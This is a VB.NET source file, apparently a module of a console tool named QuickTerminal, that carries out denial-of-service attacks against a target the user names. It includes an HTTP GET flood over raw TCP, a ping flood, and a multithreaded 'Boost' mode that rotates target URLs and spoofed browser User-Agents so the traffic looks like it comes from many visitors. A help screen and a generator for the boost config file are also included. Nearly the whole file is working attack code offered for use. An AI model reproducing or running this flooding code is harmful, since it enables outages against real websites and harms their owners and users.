Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Console
Imports System.Threading
Imports System.Net.Sockets
Imports System.Net.NetworkInformation
Public Class Ddos
    '[Threads]
    Dim t1 As Thread
    Dim t2 As Thread
    Dim t3 As Thread
    Dim t4 As Thread
    Dim t5 As Thread

    '[Public Vars]
    Public REQ As Integer = 0
    Public Reply As Integer = 0
    Public Dropped As Integer = 0
    Public Attack_Stop As Boolean = False
    Public Psent As Integer = 0
    Public threadNum As Integer = 0
    Public Attack_Type As String = ""

    '[Local Vars]
    Dim Attack_Target As String
    Dim Interval As Integer
    Dim Booster As Boolean
    Dim Booster_File As String
    Dim Booster_Whole()
    Dim Booster_Urls As New ArrayList
    Dim Boosters_UserAgent As New ArrayList
    Dim numm As Integer = 0
    Dim numm2 As Integer = 0

    Public Sub help()
        WriteLine()
        WriteLine("--DDOS HELP--")
        WriteLine("Syntax: ")
        WriteLine("Normal:    ddos <type> <target> <wait>")
        WriteLine("For Boost: ddos <type> <target> <boostfile> <wait>")
        WriteLine()
        WriteLine("<type>      can be http, ping, boost, make")
        WriteLine("<target>    can be a web address or an IP")
        WriteLine("<boostfile> has to be a valid boost.qt file")
        WriteLine("<wait>      has to be a number 0 or higher")
        WriteLine()
        WriteLine("<type>      different kind of ddos attacks (make creates a boost file)")
        WriteLine("<target>    who you want to attack")
        WriteLine("<boostfile> a script for custom urls and User-Agents for http attack")
        WriteLine("<wait>      used to make threads wait before connecting to the target again")
        WriteLine("For more info on Ddos-ing see: ")
        WriteLine("http://en.wikipedia.org/wiki/Denial-of-service_attack")
        WriteLine("or type 'ddos?'")
        Main()
    End Sub

    Public Sub WhatsDdos()
        Try
            Process.Start("http://en.wikipedia.org/wiki/Denial-of-service_attack")
        Catch ex As Exception
            WriteLine(ex.Data)
        End Try
        Main()
    End Sub

    Public Sub Boost_Make()
        Try
            File.WriteAllText("Boost.qt", "//NO WHITE SPACES | Do not edit this line or lines that contain -- | URLS should contain pages from target server (e.x. home.html) DO NOT INCLUDE THE WEBSITE |" & vbNewLine _
     & "//REPLACE SPACES IN URL WITH %20 (e.x. my house.jpg would be my%20house.jpg) | ALWAYS keep index.html unless you know what you are doing!" & vbNewLine _
    & "--Urls" & vbNewLine _
    & "//Should be in order from largest file to smallest (requests urls randomly but the higher they are on the list the more they are used)" & vbNewLine _
    & "index.html" & vbNewLine _
    & "//User Agents are used to make the server work harder and change the way it displays a web page, it also looks like more than one person." & vbNewLine _
    & "--UserAgents" & vbNewLine _
    & "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" & vbNewLine _
    & "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" & vbNewLine _
    & "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)" & vbNewLine _
    & "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)" & vbNewLine _
    & "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.1; .NET CLR 1.1.4322)" & vbNewLine _
    & "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" & vbNewLine _
    & "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14" & vbNewLine _
    & "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.600.0 Safari/534.14" & vbNewLine _
    & "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13" & vbNewLine _
    & "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04 Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13" & vbNewLine _
    & "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)" & vbNewLine _
    & "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)" & vbNewLine _
    & "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; zh-cn) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5" & vbNewLine _
    & "--End")
        Catch
            Er(Err.Number, Err.Description)
        End Try
        WriteLine("Made Boost.qt")
        Main()
    End Sub

    Public Sub Start(ByVal Target As String, ByVal Type As String, Optional Power As Integer = 100)
        If Target.Contains("quitetiny.com") = True Or Target.Contains("mailex.us") = True Then
            WriteLine("No.")
            Main()
        ElseIf Target.Contains("hpregional.net") = True Or Target.Contains("108.162.29.53") = True Then
            WriteLine("No.")
            Main()
        ElseIf Target.Contains("nursemckenny.com") = True Then
            WriteLine("No.")
            Main()
        End If
        Attack_Target = Target
        Attack_Type = Type
        Interval = Power
        WriteLine("Pinging " & Target & " to see if its online...")
        If Ping_Server(Target) = True Then
            WriteLine(Target & " seems to be online.")
            'do work
            Attack_Threading()
        ElseIf Ping_Server(Target) = False Then
            WriteLine(Target & " seems to be offline or blocking our ping packets." & vbNewLine _
                      & "Would you like to continue anyway? [Y/N]")
            Dim inpt As String
a:
            ForegroundColor = ConsoleColor.Cyan
            Write("> ")
            ForegroundColor = ConsoleColor.Gray
            inpt = ReadLine()
            If inpt.ToLower = "y" Or inpt.ToLower.StartsWith("y") Then
                'do work
                Attack_Threading()
            ElseIf inpt.ToLower = "n" Or inpt.ToLower.StartsWith("N") Then
                Main()
            Else
                GoTo a
            End If
        Else
            WriteLine("Error")
            Main()
        End If
    End Sub

    Public Sub Boost_Start(ByVal Target As String, ByVal Boost As String, Optional Power As Integer = 1)
        If Target.Contains("quitetiny.com") = True Or Target.Contains("mailex.us") = True Then
            WriteLine("No.")
            Main()
        ElseIf Target.Contains("hpregional.net") = True Or Target.Contains("108.162.29.53") = True Then
            WriteLine("No.")
            Main()
        ElseIf Target.Contains("nursemckenny.com") = True Then
            WriteLine("No.")
            Main()
        End If
        Attack_Target = Target
        Booster = True
        Interval = Power
        Attack_Type = "Boost"
        If File.Exists(Boost) = False Then
            WriteLine("Booster not found: '" & Boost & "'")
            Main()
        End If
        Booster_File = Boost
        WriteLine("Pinging " & Target & " to see if its online...")
        If Ping_Server(Target) = True Then
            WriteLine(Target & " seems to be online.")
            'do work
            Boost_Setup()
        ElseIf Ping_Server(Target) = False Then
            WriteLine(Target & " seems to be offline or blocking our ping packets." & vbNewLine _
                      & "Would you like to continue anyway? [Y/N]")
            Dim inpt As String
a:
            ForegroundColor = ConsoleColor.Cyan
            Write("> ")
            ForegroundColor = ConsoleColor.Gray
            inpt = ReadLine()
            If inpt.ToLower = "y" Or inpt.ToLower.StartsWith("y") Then
                'do work
                Boost_Setup()
            ElseIf inpt.ToLower = "n" Or inpt.ToLower.StartsWith("N") Then
                Main()
            Else
                GoTo a
            End If
        Else
            WriteLine("Error")
            Main()
        End If
    End Sub

    Private Sub Http_Attack()
        'Dim w As WebClient
        threadNum = 0
        Dim test(15) As Byte
        Dim byteBuffer = Encoding.ASCII.GetBytes("GET / HTTP/1.0" & vbNewLine & "Accept: */*" & vbNewLine & "Accept-Language: en" & vbNewLine & "Host: " & Attack_Target & vbNewLine & vbNewLine)
        Do Until Attack_Stop = True
            Try
                Dim Client As New TcpClient
                Dim Data As NetworkStream
                Client.Connect(Attack_Target, 80)
                Data = Client.GetStream
                Data.Write(byteBuffer, 0, byteBuffer.Length)
                'Console.WriteLine("Sent {0} bytes to server...", byteBuffer.Length)
                REQ = REQ + 1
                Data.Read(test, 0, 15)
                Reply = Reply + 1
                Client.Close()
                Data.Flush()
                Data.Close()
                Thread.Sleep(Interval)
            Catch ex As Exception
                'WriteLine(ex.Message)
            End Try
        Loop
        threadNum += 1
        WriteLine("DDOS Thread #" & threadNum & " stoped.")
        TRunning -= 1
        If threadNum = 5 Then
            Write("Press any key to continue...")
        End If
    End Sub


    Private Sub Ping_Attack()
        threadNum = 0
        Dim Packet(65500)
        Packet(65500) = Encoding.ASCII.GetBytes("11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111")
        Dim Ping As New Ping
        Try
a:
            Ping.Send(Attack_Target, 1, Packet(65500))
            Psent += 1
            If Attack_Stop = True Then
                threadNum += 1
                WriteLine("DDOS Thread #" & threadNum & " stoped.")
                TRunning -= 1
                If threadNum = 5 Then
                    Write("Press any key to continue...")
                End If
                Exit Sub
            End If
            Thread.Sleep(Interval)
            GoTo a
        Catch
            GoTo a
        End Try
    End Sub

    Private Sub Boost_Setup()
        WriteLine("Setting up Boost")
        Dim i As Integer = 0
        Booster_Whole = File.ReadAllLines(Booster_File)
        Do Until Booster_Whole(i) = "--UserAgents"
            'MsgBox(Booster_Whole(i))
            If Booster_Whole(i).ToString.StartsWith("//") = True Then
                i += 1
                GoTo a
            End If
            Booster_Urls.Add(Booster_Whole(i))
            i += 1
a:
        Loop
        i += 1
        Do Until Booster_Whole(i) = "--End"
            If Booster_Whole(i).ToString.StartsWith("//") = True Then '// comments
                i += 1
                GoTo b
            End If
            Boosters_UserAgent.Add(Booster_Whole(i))
            i += 1
b:
        Loop
        If Booster_Urls.Count = 0 Then
            WriteLine("Missing URLs")
            Main()
        ElseIf Boosters_UserAgent.Count = 0 Then
            WriteLine("Missing UserAgents")
            Main()
        End If
        WriteLine()
        Dim l As Integer = 0
        Do Until l = Booster_Urls.Count
            WriteLine(Booster_Urls.Item(l))
            l += 1
        Loop
        ReadLine()
        Attack_Threading()
    End Sub

    Private Sub Boost_Attack()

        threadNum = 0
        numm = 0
        numm2 = 0
        Dim test(15) As Byte
        Do Until Attack_Stop = True
            If numm = Boosters_UserAgent.Count - 5 Then 'randomizes
                numm = 0
            ElseIf numm2 = Booster_Urls.Count - 5 Then
                numm2 = 0
            End If
            Try
                Dim byteBuffer = Encoding.ASCII.GetBytes("GET /" & Booster_Urls.Item(numm2) & " HTTP/1.0" & vbNewLine & "Host: " & Attack_Target & vbNewLine & "User-Agent: " & Boosters_UserAgent.Item(numm) & vbNewLine & "Accept: */*" & vbNewLine & "Accept-Language: en" & vbNewLine & vbNewLine)
                numm += 1
                numm2 += 1
                Dim Client As New TcpClient
                Client.ReceiveTimeout = 1
                Dim Data As NetworkStream
                Client.Connect(Attack_Target, 80)
                Data = Client.GetStream
                Data.Write(byteBuffer, 0, byteBuffer.Length)
                REQ = REQ + 1
                Data.Read(test, 0, 15)
                Reply = Reply + 1
                Client.Close()
                Data.Flush()
                Data.Close()
                Thread.Sleep(Interval)
            Catch
                Err.Clear()
                numm = 0
                numm2 = 0
            End Try
        Loop
        threadNum += 1
        WriteLine("DDOS Thread #" & threadNum & " stoped.")
        TRunning -= 1
        If threadNum = 30 Then
            Write("Press any key to continue...")
        End If
    End Sub

    Private Sub Attack_Threading()
        Attack_Stop = False
        If Attack_Type = "http" Then
            t1 = New Threading.Thread(AddressOf Http_Attack)
            t2 = New Threading.Thread(AddressOf Http_Attack)
            t3 = New Threading.Thread(AddressOf Http_Attack)
            t4 = New Threading.Thread(AddressOf Http_Attack)
            t5 = New Threading.Thread(AddressOf Http_Attack)
            TRunning += 5
        ElseIf Attack_Type = "ping" Then
            t1 = New Threading.Thread(AddressOf Ping_Attack)
            t2 = New Threading.Thread(AddressOf Ping_Attack)
            t3 = New Threading.Thread(AddressOf Ping_Attack)
            t4 = New Threading.Thread(AddressOf Ping_Attack)
            t5 = New Threading.Thread(AddressOf Ping_Attack)
            TRunning += 5
        ElseIf Attack_Type = "Boost" Then
            ForegroundColor = ConsoleColor.Yellow
            WriteLine("Warning: Boost may slow down your computer until stopped.")
            ForegroundColor = ConsoleColor.White
            'Make more threads then 5, maybe 25?
            t1 = New Threading.Thread(AddressOf Boost_Attack)
            t2 = New Threading.Thread(AddressOf Boost_Attack)
            t3 = New Threading.Thread(AddressOf Boost_Attack)
            t4 = New Threading.Thread(AddressOf Boost_Attack)
            t5 = New Threading.Thread(AddressOf Boost_Attack)
            t1.Priority = ThreadPriority.Highest
            'holy resources
            Dim t6 As New Thread(AddressOf Boost_Attack)
            Dim t7 As New Thread(AddressOf Boost_Attack)
            Dim t8 As New Thread(AddressOf Boost_Attack)
            Dim t9 As New Thread(AddressOf Boost_Attack)
            Dim t10 As New Thread(AddressOf Boost_Attack)
            Dim t11 As New Thread(AddressOf Boost_Attack)
            Dim t12 As New Thread(AddressOf Boost_Attack)
            Dim t13 As New Thread(AddressOf Boost_Attack)
            Dim t14 As New Thread(AddressOf Boost_Attack)
            Dim t15 As New Thread(AddressOf Boost_Attack)
            Dim t16 As New Thread(AddressOf Boost_Attack)
            Dim t17 As New Thread(AddressOf Boost_Attack)
            Dim t18 As New Thread(AddressOf Boost_Attack)
            Dim t19 As New Thread(AddressOf Boost_Attack)
            Dim t20 As New Thread(AddressOf Boost_Attack)
            Dim t21 As New Thread(AddressOf Boost_Attack)
            Dim t22 As New Thread(AddressOf Boost_Attack)
            Dim t23 As New Thread(AddressOf Boost_Attack)
            Dim t24 As New Thread(AddressOf Boost_Attack)
            Dim t25 As New Thread(AddressOf Boost_Attack)
            Dim t26 As New Thread(AddressOf Boost_Attack)
            Dim t27 As New Thread(AddressOf Boost_Attack)
            Dim t28 As New Thread(AddressOf Boost_Attack)
            Dim t29 As New Thread(AddressOf Boost_Attack)
            Dim t30 As New Thread(AddressOf Boost_Attack)
            t6.Start()
            t7.Start()
            t8.Start()
            t9.Start()
            t10.Start()
            t11.Start()
            t12.Start()
            t13.Start()
            t14.Start()
            t15.Start()
            t16.Start()
            t17.Start()
            t18.Start()
            t19.Start()
            t20.Start()
            t21.Start()
            t22.Start()
            t23.Start()
            t24.Start()
            t25.Start()
            t26.Start()
            t27.Start()
            t28.Start()
            t29.Start()
            t30.Start()
            TRunning += 30
        Else
            Exit Sub
        End If
        t1.Start()
        t2.Start()
        t3.Start()
        t4.Start()
        t5.Start()
        WriteLine("Attack started.")
    End Sub
    Public Sub eStop()
        WriteLine("Stopping NOW")
        WriteLine("This will require you to restart QuickTerminal to do ddos again")
        Attack_Stop = True
        t1.Abort()
        t2.Abort()
        t3.Abort()
        t4.Abort()
        t5.Abort()
        TRunning -= 5
    End Sub
    Private Function Ping_Server(ByVal Server As String)
        Try
            Return My.Computer.Network.Ping(Server)
        Catch
            Er(Err.Number, Err.Description)
            Return "Error"
        End Try
    End Function
End Class
